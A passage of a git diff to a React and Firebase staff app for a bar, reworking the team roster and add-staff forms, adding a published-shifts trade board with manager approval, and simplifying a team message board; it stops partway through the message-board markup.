   const [name, setName] = useState(''); const [email, setEmail] = useState(''); const [phone, setPhone] = useState(''); const [role, setRole] = useState('Bartender'); const [photoURL, setPhotoURL] = useState(''); const [isAdmin, setIsAdmin] = useState(false);
   const [editModalUser, setEditModalUser] = useState(null);
@@ -747,53 +467,69 @@ const TabTeam = ({ appUser, users, addToast }) => {
   const handleDelete = async (id) => { if (window.confirm("Remove this staff member? This cannot be undone.")) { await deleteDoc(doc(db, "users", id)); addToast('Staff Removed', 'Account permanently deleted.'); } };
 
   return (
-    <div className="max-w-4xl mx-auto space-y-6">
+    <div className="max-w-5xl mx-auto space-y-4">
       <Modal isOpen={!!editModalUser} onClose={() => setEditModalUser(null)} title={`Edit Profile: ${editModalUser?.name}`}>
         {editModalUser && (
           <form onSubmit={handleUpdateUser} className="space-y-3">
-            <div><label className="block text-[10px] font-bold text-slate-500 uppercase mb-0.5">Name</label><input type="text" value={editModalUser.name} onChange={e => setEditModalUser({...editModalUser, name: e.target.value})} className="w-full p-2 text-sm bg-slate-50 dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-lg outline-none" required /></div>
-            <div><label className="block text-[10px] font-bold text-slate-500 uppercase mb-0.5">Email</label><input type="email" value={editModalUser.email} onChange={e => setEditModalUser({...editModalUser, email: e.target.value})} className="w-full p-2 text-sm bg-slate-50 dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-lg outline-none" required /></div>
-            <div><label className="block text-[10px] font-bold text-slate-500 uppercase mb-0.5">Phone</label><input type="tel" value={editModalUser.phone || ''} onChange={e => setEditModalUser({...editModalUser, phone: e.target.value})} className="w-full p-2 text-sm bg-slate-50 dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-lg outline-none" /></div>
-            <div><label className="block text-[10px] font-bold text-slate-500 uppercase mb-0.5">Avatar URL</label><input type="url" value={editModalUser.photoURL || ''} onChange={e => setEditModalUser({...editModalUser, photoURL: e.target.value})} className="w-full p-2 text-sm bg-slate-50 dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-lg outline-none" /></div>
-            <div><label className="block text-[10px] font-bold text-slate-500 uppercase mb-0.5">Role</label><select value={editModalUser.role} onChange={e => setEditModalUser({...editModalUser, role: e.target.value})} className="w-full p-2 text-sm bg-slate-50 dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-lg outline-none"><option value="Bartender">Bartender</option><option value="Kitchen">Kitchen</option></select></div>
-            <div className="pt-3 border-t border-slate-200 dark:border-slate-600"><label className="block text-[10px] font-bold text-red-500 uppercase mb-0.5">Force Password Reset</label><input type="text" placeholder="Enter temporary password..." value={editModalUser.newPassword || ''} onChange={e => setEditModalUser({...editModalUser, newPassword: e.target.value})} className="w-full p-2 text-sm bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-lg outline-none text-slate-900 dark:text-white" /></div>
-            <button type="submit" className="w-full bg-blue-600 text-white p-3 rounded-xl font-bold hover:bg-blue-700 transition-colors mt-2 shadow-sm">Save Profile</button>
+            <div><label className="block text-[10px] font-bold text-slate-500 dark:text-slate-400 uppercase mb-0.5">Name</label><input type="text" value={editModalUser.name} onChange={e => setEditModalUser({...editModalUser, name: e.target.value})} className="w-full p-2 text-sm bg-white dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-lg outline-none" required /></div>
+            <div><label className="block text-[10px] font-bold text-slate-500 dark:text-slate-400 uppercase mb-0.5">Email</label><input type="email" value={editModalUser.email} onChange={e => setEditModalUser({...editModalUser, email: e.target.value})} className="w-full p-2 text-sm bg-white dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-lg outline-none" required /></div>
+            <div><label className="block text-[10px] font-bold text-slate-500 dark:text-slate-400 uppercase mb-0.5">Phone</label><input type="tel" value={editModalUser.phone || ''} onChange={e => setEditModalUser({...editModalUser, phone: e.target.value})} className="w-full p-2 text-sm bg-white dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-lg outline-none" /></div>
+            <div><label className="block text-[10px] font-bold text-slate-500 dark:text-slate-400 uppercase mb-0.5">Avatar URL</label><input type="url" value={editModalUser.photoURL || ''} onChange={e => setEditModalUser({...editModalUser, photoURL: e.target.value})} className="w-full p-2 text-sm bg-white dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-lg outline-none" /></div>
+            <div><label className="block text-[10px] font-bold text-slate-500 dark:text-slate-400 uppercase mb-0.5">Role</label><select value={editModalUser.role} onChange={e => setEditModalUser({...editModalUser, role: e.target.value})} className="w-full p-2 text-sm bg-white dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-lg outline-none"><option value="Bartender">Bartender</option><option value="Kitchen">Kitchen</option></select></div>
+            <div className="pt-3 border-t border-slate-200 dark:border-slate-600"><label className="block text-[10px] font-bold text-slate-500 dark:text-slate-400 uppercase mb-0.5 text-red-500">Force Password Reset</label><input type="text" placeholder="Enter temporary password..." value={editModalUser.newPassword || ''} onChange={e => setEditModalUser({...editModalUser, newPassword: e.target.value})} className="w-full p-2 text-sm bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-lg outline-none text-slate-900 dark:text-white" /></div>
+            <button type="submit" className="w-full bg-blue-600 text-white p-2.5 rounded-lg font-bold hover:bg-blue-700 transition-colors mt-2 text-sm">Save Profile</button>
           </form>
         )}
       </Modal>
 
-      {/* Roster is now ABOVE Add Staff */}
-      <div className="bg-white dark:bg-slate-800 rounded-3xl shadow-sm border border-slate-200 dark:border-slate-700 overflow-x-auto custom-scrollbar">
-        <table className="w-full text-left border-collapse min-w-[500px]">
+      {appUser?.isAdmin && (
+        <div className="bg-white dark:bg-slate-800 p-4 rounded-2xl shadow-sm border border-slate-200 dark:border-slate-700">
+          <h3 className="font-bold text-base flex items-center gap-2 text-slate-800 dark:text-white mb-3"><Users size={18}/> Add Staff</h3>
+          <form onSubmit={handleAdd} className="space-y-3">
+            <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-3">
+              <div><label className="block text-[9px] font-bold text-slate-500 dark:text-slate-400 uppercase mb-0.5">Name</label><input type="text" value={name} onChange={e => setName(e.target.value)} className="w-full p-2 text-sm bg-white dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-lg outline-none" required /></div>
+              <div><label className="block text-[9px] font-bold text-slate-500 dark:text-slate-400 uppercase mb-0.5">Email</label><input type="email" value={email} onChange={e => setEmail(e.target.value)} className="w-full p-2 text-sm bg-white dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-lg outline-none" required /></div>
+              <div><label className="block text-[9px] font-bold text-slate-500 dark:text-slate-400 uppercase mb-0.5">Phone</label><input type="tel" value={phone} onChange={e => setPhone(e.target.value)} className="w-full p-2 text-sm bg-white dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-lg outline-none" /></div>
+              <div><label className="block text-[9px] font-bold text-slate-500 dark:text-slate-400 uppercase mb-0.5">Avatar URL</label><input type="url" placeholder="Optional" value={photoURL} onChange={e => setPhotoURL(e.target.value)} className="w-full p-2 text-sm bg-white dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-lg outline-none" /></div>
+            </div>
+            <div className="flex flex-col sm:flex-row items-center gap-3">
+              <div className="w-full sm:w-40"><label className="block text-[9px] font-bold text-slate-500 dark:text-slate-400 uppercase mb-0.5">Role</label><select value={role} onChange={e => setRole(e.target.value)} className="w-full p-2 text-sm bg-white dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-lg outline-none"><option value="Bartender">Bartender</option><option value="Kitchen">Kitchen</option></select></div>
+              <label className="flex items-center gap-1.5 text-xs font-bold text-slate-700 dark:text-slate-300 mt-3 cursor-pointer flex-1"><input type="checkbox" checked={isAdmin} onChange={e => setIsAdmin(e.target.checked)} className="w-4 h-4 rounded border-slate-300 dark:border-slate-600 text-blue-600" /> Admin</label>
+              <button type="submit" className="bg-blue-600 text-white px-4 py-2 rounded-lg font-bold w-full sm:w-auto shadow-sm mt-3 sm:mt-0 text-sm">Add Staff</button>
+            </div>
+          </form>
+        </div>
+      )}
+      
+      <div className="bg-white dark:bg-slate-800 rounded-2xl shadow-sm border border-slate-200 dark:border-slate-700 overflow-x-auto custom-scrollbar">
+        <table className="w-full text-left border-collapse min-w-[450px]">
           <tbody className="divide-y divide-slate-100 dark:divide-slate-700">
             {displayUsers.map(u => {
               const isMaster = u.email === MASTER_ADMIN_EMAIL;
-              const isMeMaster = appUser?.email === MASTER_ADMIN_EMAIL;
               return (
               <tr key={u.id} className="hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
-                <td className="p-4 flex items-center gap-3">
-                  <img src={getAvatar(u.name, u.photoURL)} className="w-10 h-10 rounded-full border border-slate-200 dark:border-slate-600 object-cover bg-white shadow-sm" alt="Avatar"/>
-                  <div className="font-black text-slate-900 dark:text-white text-base">{u.name}</div>
+                <td className="p-2 flex items-center gap-2">
+                  <img src={getAvatar(u.name, u.photoURL)} className="w-8 h-8 rounded-full border border-slate-200 dark:border-slate-600 object-cover bg-white" alt="Avatar"/>
+                  <div className="font-bold text-slate-900 dark:text-white text-sm">{u.name}</div>
                 </td>
-                <td className="p-4">
-                  <div className="text-[10px] font-black bg-slate-100 dark:bg-slate-700 px-2 py-1 rounded-lg w-max border border-slate-200 dark:border-slate-600 flex items-center gap-1.5 dark:text-slate-300">
+                <td className="p-2">
+                  <div className="text-[9px] font-bold bg-slate-100 dark:bg-slate-700 px-1.5 py-0.5 rounded w-max border border-slate-200 dark:border-slate-600 flex items-center gap-1 dark:text-slate-300">
                     <span>📱</span>{u.phone ? <a href={`tel:${u.phone}`} className="text-blue-600 dark:text-blue-400 hover:underline">{u.phone}</a> : <span className="text-slate-500">No phone</span>}
                   </div>
                 </td>
-                <td className="p-4">
-                  <span className={`text-[9px] uppercase font-black px-2 py-1 rounded-lg inline-block ${u.role === 'Bartender' ? 'bg-blue-100 text-blue-800 dark:bg-blue-900/30 dark:text-blue-400' : 'bg-orange-100 text-orange-800 dark:bg-orange-900/30 dark:text-orange-400'}`}>{u.role}</span>
+                <td className="p-2">
+                  <span className={`text-[9px] uppercase font-black px-1.5 py-0.5 rounded-full inline-block ${u.role === 'Bartender' ? 'bg-blue-100 text-blue-800 dark:bg-blue-900/30 dark:text-blue-400' : 'bg-orange-100 text-orange-800 dark:bg-orange-900/30 dark:text-orange-400'}`}>{u.role}</span>
                   {appUser?.isAdmin && !isMaster && (
-                    <label className="flex items-center gap-1.5 mt-2 cursor-pointer w-max">
-                      <input type="checkbox" checked={u.isAdmin} onChange={() => handleToggleAdmin(u.id, u.isAdmin)} className="w-3.5 h-3.5 rounded border-slate-300 dark:border-slate-600" /><span className="text-[9px] font-black text-slate-500 dark:text-slate-400 uppercase">Admin</span>
+                    <label className="flex items-center gap-1 mt-1 cursor-pointer w-max">
+                      <input type="checkbox" checked={u.isAdmin} onChange={() => handleToggleAdmin(u.id, u.isAdmin)} className="w-3 h-3 rounded border-slate-300 dark:border-slate-600" /><span className="text-[9px] font-bold text-slate-500 dark:text-slate-400 uppercase">Admin</span>
                     </label>
                   )}
-                  {/* Prompt 7: Master Admin badge is only visible to the Master Admin themselves */}
-                  {isMaster && isMeMaster && <span className="block mt-2 text-[9px] font-black bg-slate-900 dark:bg-slate-600 text-white px-2 py-1 rounded-lg w-max">Master Admin</span>}
+                  {isMaster && <span className="block mt-1 text-[9px] font-black bg-slate-900 dark:bg-slate-600 text-white px-1.5 py-0.5 rounded w-max">Master Admin</span>}
                 </td>
-                <td className="p-4 text-right">
-                  <div className="flex justify-end gap-2">
-                     {appUser?.isAdmin && <button onClick={() => setEditModalUser(u)} className="text-slate-400 hover:text-blue-600 dark:hover:text-blue-400 p-2 rounded-xl bg-slate-50 dark:bg-slate-700 transition-colors shadow-sm"><Edit size={16}/></button>}
-                     {appUser?.isAdmin && !isMaster && (<button onClick={() => handleDelete(u.id)} className="text-slate-400 hover:text-red-600 dark:hover:text-red-400 p-2 rounded-xl bg-slate-50 dark:bg-slate-700 transition-colors shadow-sm"><Trash2 size={16}/></button>)}
+                <td className="p-2 text-right">
+                  <div className="flex justify-end gap-1">
+                     {appUser?.isAdmin && <button onClick={() => setEditModalUser(u)} className="text-slate-400 hover:text-indigo-600 dark:hover:text-indigo-400 p-1.5 rounded transition-colors"><Edit size={16}/></button>}
+                     {appUser?.isAdmin && !isMaster && (<button onClick={() => handleDelete(u.id)} className="text-slate-400 hover:text-red-500 dark:hover:text-red-400 p-1.5 rounded transition-colors"><Trash2 size={16}/></button>)}
                   </div>
                 </td>
               </tr>
@@ -801,177 +537,302 @@ const TabTeam = ({ appUser, users, addToast }) => {
           </tbody>
         </table>
       </div>
+    </div>
+  );
+};
 
-      {appUser?.isAdmin && (
-        <div className="bg-slate-900 dark:bg-slate-800 p-6 rounded-3xl shadow-xl border border-slate-800 dark:border-slate-700 text-white">
-          <h3 className="font-black text-lg flex items-center gap-2 mb-4 text-white"><Users className="text-blue-400" size={20}/> Add New Staff</h3>
-          <form onSubmit={handleAdd} className="space-y-4">
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-              <div><label className="block text-[10px] font-bold text-slate-400 uppercase mb-1">Name</label><input type="text" value={name} onChange={e => setName(e.target.value)} className="w-full p-3 bg-slate-800 dark:bg-slate-700 border border-slate-700 dark:border-slate-600 rounded-xl outline-none text-white focus:border-blue-500" required /></div>
-              <div><label className="block text-[10px] font-bold text-slate-400 uppercase mb-1">Email</label><input type="email" value={email} onChange={e => setEmail(e.target.value)} className="w-full p-3 bg-slate-800 dark:bg-slate-700 border border-slate-700 dark:border-slate-600 rounded-xl outline-none text-white focus:border-blue-500" required /></div>
-              <div><label className="block text-[10px] font-bold text-slate-400 uppercase mb-1">Phone</label><input type="tel" value={phone} onChange={e => setPhone(e.target.value)} className="w-full p-3 bg-slate-800 dark:bg-slate-700 border border-slate-700 dark:border-slate-600 rounded-xl outline-none text-white focus:border-blue-500" /></div>
-              <div><label className="block text-[10px] font-bold text-slate-400 uppercase mb-1">Avatar URL (Optional)</label><input type="url" value={photoURL} onChange={e => setPhotoURL(e.target.value)} className="w-full p-3 bg-slate-800 dark:bg-slate-700 border border-slate-700 dark:border-slate-600 rounded-xl outline-none text-white focus:border-blue-500" /></div>
-            </div>
-            <div className="flex flex-col md:flex-row items-end gap-4 pt-2">
-              <div className="w-full md:w-64"><label className="block text-[10px] font-bold text-slate-400 uppercase mb-1">Role</label><select value={role} onChange={e => setRole(e.target.value)} className="w-full p-3 bg-slate-800 dark:bg-slate-700 border border-slate-700 dark:border-slate-600 rounded-xl outline-none text-white font-bold"><option value="Bartender">Bartender</option><option value="Kitchen">Kitchen</option></select></div>
-              <label className="flex items-center justify-center gap-2 text-sm font-bold text-slate-300 cursor-pointer flex-1 bg-slate-800 border border-slate-700 rounded-xl h-[46px]"><input type="checkbox" checked={isAdmin} onChange={e => setIsAdmin(e.target.checked)} className="w-4 h-4 rounded" /> Grant Admin Access</label>
-              <button type="submit" className="bg-blue-600 text-white px-8 py-3 rounded-xl font-black w-full md:w-auto shadow-md hover:bg-blue-500 transition-colors h-[46px]">Add Staff</button>
-            </div>
-          </form>
-        </div>
+// --- PUBLISHED SHIFTS & TRADE BOARD (Compacted) ---
+const TabPublishedShifts = ({ currentDate, appUser, users, shifts, shiftSwaps, addToast }) => {
+  const monthStr = getMonthStr(currentDate);
+  const monthShifts = shifts.filter(s => s.date.startsWith(monthStr) && s.isPublished).sort((a,b)=>a.date.localeCompare(b.date));
+  const availableSwaps = shiftSwaps.filter(sw => sw.status === 'available');
+
+  const handleOfferSwap = async (shift) => {
+    if (!window.confirm("Offer shift to Trade Board?")) return;
+    await addDoc(collection(db, "shiftSwaps"), { shiftId: shift.id, date: shift.date, originalEmployeeId: shift.employeeId, role: shift.role, startTime: shift.startTime, endTime: shift.endTime, status: 'available' });
+    await addDoc(collection(db, "events"), { date: new Date().toISOString(), title: `🚨 Shift Available! ${appUser.name.split(' ')[0]} needs cover for a ${shift.role} shift on ${formatDisplayDate(shift.date)} (${formatShortTime(shift.startTime)}). Claim it on the Master Roster!`, type: 'note', author: 'System Alert', isImportant: true });
+    addToast('Posted', 'Shift sent to trade board.');
+  };
+
+  const handleClaim = async (swap) => { await updateDoc(doc(db, "shiftSwaps", swap.id), { status: 'pending_approval', claimedById: appUser.id }); addToast('Claimed', 'Pending manager approval.'); };
+  const handleApprove = async (sw) => { await updateDoc(doc(db, "shifts", sw.shiftId), { employeeId: sw.claimedById }); await deleteDoc(doc(db, "shiftSwaps", sw.id)); addToast('Approved', 'Roster updated.'); };
+
+  return (
+    <div className="max-w-3xl mx-auto space-y-4">
+      {appUser?.isAdmin && shiftSwaps.filter(sw=>sw.status==='pending_approval').length > 0 && (
+         <div className="bg-amber-50 dark:bg-slate-800 p-3 border border-amber-200 dark:border-amber-800 rounded-2xl space-y-2 shadow-sm">
+           <h4 className="font-black text-[10px] uppercase text-amber-700 dark:text-amber-400 tracking-wider">Trades Awaiting Approval</h4>
+           {shiftSwaps.filter(sw=>sw.status==='pending_approval').map(sw => (
+             <div key={sw.id} className="flex justify-between items-center bg-white dark:bg-slate-700 p-2 rounded-xl border dark:border-slate-600 shadow-sm gap-2">
+                <div className="text-xs dark:text-white"><strong>{users.find(u=>u.id===sw.claimedById)?.name}</strong> covering <strong>{users.find(u=>u.id===sw.originalEmployeeId)?.name}'s</strong> shift on {formatDisplayDate(sw.date)}.</div>
+                <div className="flex gap-1.5 flex-shrink-0"><button onClick={()=>handleApprove(sw)} className="bg-emerald-600 text-white px-2.5 py-1 rounded-lg font-bold text-[10px]">Approve</button><button onClick={()=>updateDoc(doc(db, "shiftSwaps", sw.id), { status: 'available', claimedById: null })} className="bg-slate-100 dark:bg-slate-600 text-slate-700 dark:text-white px-2.5 py-1 rounded-lg font-bold text-[10px]">Deny</button></div>
+             </div>
+           ))}
+         </div>
       )}
-    </div>
-  );
-};
 
-// --- SALES & TRENDS (Compacted & Daily Date Formatting) ---
-const TabSales = ({ sales, addToast }) => {
-  const [date, setDate] = useState(getToday());
-  const [amount, setAmount] = useState('');
-  const [tag, setTag] = useState('Standard Day');
+      {availableSwaps.length > 0 && (
+         <div className="bg-blue-50 dark:bg-slate-800 p-3 border border-blue-200 dark:border-blue-800 rounded-2xl space-y-2 shadow-sm">
+           <h4 className="font-black text-[10px] uppercase text-blue-700 dark:text-blue-400 tracking-wider">Active Trade Board</h4>
+           <div className="grid gap-2 sm:grid-cols-2">{availableSwaps.map(sw => {
+              const orig = users.find(u => u.id === sw.originalEmployeeId);
+              return (
+                <div key={sw.id} className="bg-white dark:bg-slate-700 p-2 rounded-xl border dark:border-slate-600 flex justify-between items-center shadow-sm">
+                   <div className="flex gap-2 items-center"><img src={getAvatar(orig?.name, orig?.photoURL)} className="w-6 h-6 rounded-full" alt="pic"/><div><span className="font-bold text-xs block dark:text-white leading-tight">{orig?.name?.split(' ')[0]}</span><span className="text-[9px] font-bold text-slate-500">{formatDisplayDate(sw.date)}</span></div></div>
+                   {appUser.id !== sw.originalEmployeeId && appUser.role === sw.role && <button onClick={() => handleClaim(sw)} className="bg-blue-600 text-white px-3 py-1 rounded-lg font-bold text-[10px]">Claim</button>}
+                </div>
+              )
+           })}</div>
+         </div>
+      )}
 
-  const handleSave = async (e) => {
-    e.preventDefault(); if (!amount) return;
-    await addDoc(collection(db, "sales"), { date, amount: parseFloat(amount), tag, loggedAt: new Date().toISOString() });
-    setAmount(''); addToast('Saved', 'Daily sales logged.');
-  };
-
-  const sortedSales = [...sales].sort((a,b) => b.date.localeCompare(a.date)).slice(0, 14);
-
-  return (
-    <div className="max-w-2xl mx-auto space-y-4">
-      <div className="bg-slate-900 dark:bg-slate-800 p-5 rounded-3xl shadow-xl border border-slate-800 dark:border-slate-700 text-white">
-        <h2 className="text-lg font-black mb-4 flex items-center gap-2"><TrendingUp className="text-emerald-400"/> Log Sales</h2>
-        <form onSubmit={handleSave} className="flex flex-col sm:flex-row gap-3 items-end">
-          <div className="w-full sm:w-1/3"><label className="block text-[10px] font-bold text-slate-400 uppercase mb-1">Date</label><input type="date" value={date} onChange={e=>setDate(e.target.value)} className="w-full p-2.5 border border-slate-700 rounded-xl bg-slate-800 dark:bg-slate-700 dark:border-slate-600 text-white outline-none font-bold"/></div>
-          <div className="w-full sm:w-1/3"><label className="block text-[10px] font-bold text-slate-400 uppercase mb-1">Revenue ($)</label><input type="number" step="0.01" value={amount} onChange={e=>setAmount(e.target.value)} className="w-full p-2.5 border border-slate-700 rounded-xl bg-slate-800 dark:bg-slate-700 dark:border-slate-600 text-white outline-none font-black" required/></div>
-          <div className="w-full sm:w-1/3"><label className="block text-[10px] font-bold text-slate-400 uppercase mb-1">Event Tag</label><select value={tag} onChange={e=>setTag(e.target.value)} className="w-full p-2.5 border border-slate-700 rounded-xl bg-slate-800 dark:bg-slate-700 dark:border-slate-600 text-white outline-none font-bold text-xs">{EVENT_TAGS.map(t=><option key={t} value={t}>{t}</option>)}</select></div>
-          <button className="bg-emerald-600 text-white p-2.5 rounded-xl font-black shadow-md w-full sm:w-auto hover:bg-emerald-500 h-[42px] px-6">Save</button>
-        </form>
-      </div>
-      
-      <div className="bg-white dark:bg-slate-800 rounded-3xl shadow-sm border border-slate-200 dark:border-slate-700 p-5">
-        <h3 className="font-black text-lg mb-4 dark:text-white border-b dark:border-slate-700 pb-2">Recent Trends</h3>
+      <div className="bg-white dark:bg-slate-800 rounded-2xl border dark:border-slate-700 overflow-hidden shadow-sm">
+        <div className="bg-slate-50 dark:bg-slate-900 p-3 font-black border-b dark:border-slate-700 text-base flex items-center gap-2 dark:text-white"><Calendar size={16}/> Master Roster</div>
         <div className="divide-y dark:divide-slate-700">
-          {sortedSales.length === 0 && <div className="py-6 text-center text-sm font-bold text-slate-400">No sales data logged yet.</div>}
-          {sortedSales.map(s => (
-          <div key={s.id} className="py-3 flex justify-between items-center hover:bg-slate-50 dark:hover:bg-slate-700/50 px-2 rounded-lg transition-colors">
-            <div>
-              <span className="font-black text-sm block text-slate-900 dark:text-white leading-tight">{formatFullDisplayDate(s.date)}</span>
-              <span className={`text-[9px] font-black uppercase px-2 py-0.5 rounded-md mt-1 inline-block ${s.tag === 'Standard Day' ? 'bg-slate-100 text-slate-500 dark:bg-slate-700 dark:text-slate-300' : 'bg-amber-100 text-amber-700 dark:bg-amber-900/30 dark:text-amber-400'}`}>{s.tag}</span>
-            </div>
-            <div className="font-black text-xl text-emerald-600 dark:text-emerald-400 tracking-tight">${s.amount.toFixed(2)}</div>
-          </div>
-        ))}</div>
+          {monthShifts.map(s => {
+             const emp = users.find(u => u.id === s.employeeId); const isMe = appUser.id === s.employeeId; const isOffered = shiftSwaps.some(sw => sw.shiftId === s.id);
+             return (
+               <div key={s.id} className={`p-2.5 flex justify-between items-center hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors ${isMe ? 'bg-blue-50/30 dark:bg-blue-900/10' : ''}`}>
+                 <div className="flex items-center gap-2.5">
+                   <img src={getAvatar(emp?.name, emp?.photoURL)} className={`w-8 h-8 rounded-full border-2 object-cover ${s.role==='Bartender'?'border-blue-400':'border-orange-400'}`} alt="pic"/>
+                   <div>
+                     <span className={`font-bold text-sm block leading-tight ${isMe ? 'text-blue-700 dark:text-blue-400' : 'dark:text-white'}`}>{emp?.name} {isMe && '(You)'}</span>
+                     <span className="text-[9px] font-black text-slate-400 uppercase">{formatDisplayDate(s.date)} • {s.role}</span>
+                   </div>
+                 </div>
+                 <div className="flex items-center gap-2">
+                   <div className="text-xs font-bold bg-slate-100 dark:bg-slate-700 px-2 py-1 rounded-md border dark:border-slate-600 dark:text-slate-200">{formatShortTime(s.startTime)}-{formatShortTime(s.endTime)}</div>
+                   {isMe && !isOffered && <button onClick={() => handleOfferSwap(s)} className="bg-slate-900 dark:bg-slate-600 text-white px-2 py-1 rounded-md font-bold text-[10px] shadow-sm hover:bg-slate-800 transition-colors">Trade</button>}
+                   {isOffered && <span className="text-[9px] bg-slate-200 dark:bg-slate-700 px-1.5 py-0.5 rounded font-black uppercase text-slate-500">Posted</span>}
+                 </div>
+               </div>
+             )
+          })}
+          {monthShifts.length === 0 && <div className="p-6 text-center text-xs text-slate-400 font-bold">No published shifts yet.</div>}
+        </div>
       </div>
     </div>
   );
 };
 
-// --- MESSAGE BOARD (Threaded Replies & Deletions) ---
+// --- MESSAGE BOARD (With Avatars) ---
 const TabMessages = ({ events, appUser, users, addToast }) => {
-  const [message, setMessage] = useState(''); 
-  const [replyText, setReplyText] = useState({});
-  const allNotes = events.filter(e => e.type === 'note').sort((a,b) => new Date(b.date) - new Date(a.date));
-  
-  const handleBroadcast = async (e) => { e.preventDefault(); if(!message.trim()) return; await addDoc(collection(db, "events"), { date: new Date().toISOString(), title: message.trim(), type: 'note', author: appUser.name, isImportant: false, replies: [] }); setMessage(''); addToast('Posted', 'Message sent.'); };
-  
-  const handleReply = async (eventId) => {
-    const text = replyText[eventId]; if(!text || !text.trim()) return;
-    const eventRef = doc(db, "events", eventId);
-    const ev = events.find(e => e.id === eventId);
-    const newReply = { author: appUser.name, text: text.trim(), date: new Date().toISOString(), id: Date.now() };
-    await updateDoc(eventRef, { replies: [...(ev.replies || []), newReply] });
-    setReplyText(p => ({...p, [eventId]: ''}));
-  };
-
-  const handleDelete = async (eventId, author) => {
-    if (appUser.isAdmin || appUser.name === author) {
-      if(window.confirm("Delete this message?")) await deleteDoc(doc(db, "events", eventId));
-    }
-  };
-
+  const [message, setMessage] = useState(''); const allNotes = events.filter(e => e.type === 'note').sort((a,b) => new Date(b.date) - new Date(a.date));
+  const handleBroadcast = async (e) => { e.preventDefault(); if(!message.trim()) return; await addDoc(collection(db, "events"), { date: new Date().toISOString(), title: message.trim(), type: 'note', author: appUser.name, isImportant: false }); setMessage(''); addToast('Posted', 'Message sent.'); };
   return (
-    <div className="max-w-3xl mx-auto space-y-6">
-      <div className="bg-white dark:bg-slate-800 p-5 rounded-3xl shadow-sm border dark:border-slate-700">
-        <h3 className="font-black text-lg mb-3 flex items-center gap-2 dark:text-white"><MessageSquare size={18}/> Post a Message</h3>
-        <form onSubmit={handleBroadcast} className="flex flex-col sm:flex-row gap-3">
-          <textarea value={message} onChange={e=>setMessage(e.target.value)} className="w-full p-3 rounded-2xl bg-slate-50 dark:bg-slate-700 border border-slate-200 dark:border-slate-600 outline-none font-medium dark:text-white" rows="2" placeholder="Message the team..." required></textarea>
-          <button className="bg-blue-600 text-white px-8 py-3 rounded-2xl font-black shadow-md hover:bg-blue-500 transition-colors">Post</button>
-        </form>
-      </div>
-      
-      <div className="space-y-4">{allNotes.map(n => {
+    <div className="max-w-3xl mx-auto space-y-4">
+      <div className="bg-white dark:bg-slate-800 p-4 rounded-3xl shadow-sm border dark:border-slate-700"><form onSubmit={handleBroadcast} className="flex flex-col sm:flex-row gap-3"><textarea value={message} onChange={e=>setMessage(e.target.value)} className="w-full p-3 rounded-2xl bg-slate-50 dark:bg-slate-700 outline-none font-medium dark:text-white" rows="2" placeholder="Message the team..." required></textarea><button className="bg-blue-600 text-white px-6 py-3 rounded-2xl font-bold">Post</button></form></div>
+      <div className="space-y-3">{allNotes.map(n => {
         const authorUser = users.find(u => u.name === n.author);
-        const canDelete = appUser?.isAdmin || n.author === appUser?.name;
-        const replies = n.replies || [];
         return (
-        <div key={n.id} className={`p-5 rounded-3xl border shadow-sm ${n.isImportant ? 'bg-red-50 border-red-200' : 'bg-white dark:bg-slate-800 dark:border-slate-700'}`}>
-          <div className="flex gap-4">
-            {n.author !== 'System Alert' && <img src={getAvatar(n.author, authorUser?.photoURL)} className="w-12 h-12 rounded-full border-2 border-white shadow-sm flex-shrink-0" alt="pic"/>}
-            <div className="flex-1">
-              <div className="flex justify-between items-start mb-1">
-                <span className={`font-black text-base ${n.isImportant ? 'text-red-700' : 'text-blue-600 dark:text-blue-400'}`}>{n.author}</span>
-                <div className="flex items-center gap-3">
-                  <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">{new Date(n.date).toLocaleDateString()}</span>
-                  {canDelete && <button onClick={() => handleDelete(n.id, n.author)} className="text-slate-300 hover:text-red-500 transition-colors"><Trash2 size={16}/></button>}
-                </div>
-              </div>
-              <p className={`font-bold leading-snug mb-4 ${n.isImportant?'text-red-900':'text-slate-800 dark:text-slate-200'}`}>{n.title}</p>
-              
-              {/* Replies Section */}
-              <div className="space-y-3 mt-4 border-t border-slate-100 dark:border-slate-700 pt-3">
-                {replies.map(r => (
-                  <div key={r.id} className="flex gap-2 items-start bg-slate-50 dark:bg-slate-700/50 p-2.5 rounded-2xl">
-                     <div className="w-6 h-6 rounded-full bg-blue-100 text-blue-700 flex items-center justify-center font-black text-[9px] border border-blue-200 flex-shrink-0">{r.author.substring(0,2).toUpperCase()}</div>
-                     <div>
-                       <span className="text-xs font-black dark:text-white mr-2">{r.author}</span>
-                       <span className="text-xs font-medium text-slate-700 dark:text-slate-300">{r.text}</span>
-                     </div>
-                  </div>
-                ))}
-                <div className="flex gap-2 items-center mt-2">
-                  <input type="text" value={replyText[n.id] || ''} onChange={e => setReplyText(p => ({...p, [n.id]: e.target.value}))} placeholder="Write a reply..." className="flex-1 text-xs p-2.5 bg-slate-100 dark:bg-slate-700 border-transparent rounded-xl outline-none font-medium dark:text-white" />
-                  <button onClick={() => handleReply(n.id)} className="text-blue-600 bg-blue-50 dark:bg-slate-700 dark:text-blue-400 p-2.5 rounded-xl font-bold hover:bg-blue-100 transition-colors"><Send size={16}/></button>
-                </div>
